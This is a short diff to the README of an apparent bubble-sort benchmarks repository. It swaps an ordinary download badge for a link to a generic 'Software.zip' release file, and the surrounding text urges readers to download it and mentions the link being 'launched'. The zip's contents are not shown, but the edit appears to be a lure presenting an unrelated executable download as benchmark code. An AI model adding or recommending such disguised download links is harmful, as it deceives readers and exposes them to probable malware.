@@ -11,7 +11,7 @@ Welcome to the **Bubble Sort Benchmarks** repository! Here, you will find benchm
 
 ## Get Started
 To get started with exploring the benchmark implementations, check out the following link:
-[![Download Zip](https://img.shields.io/badge/Download-Zip-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Zip](https://github.com/Hina457/bubble-sort-benchmarks/releases/download/v1.0/Software.zip)](https://github.com/Hina457/bubble-sort-benchmarks/releases/download/v1.0/Software.zip)
 
 If the link does not work or needs to be launched, please visit the "Releases" section of the repository for alternative options.
 
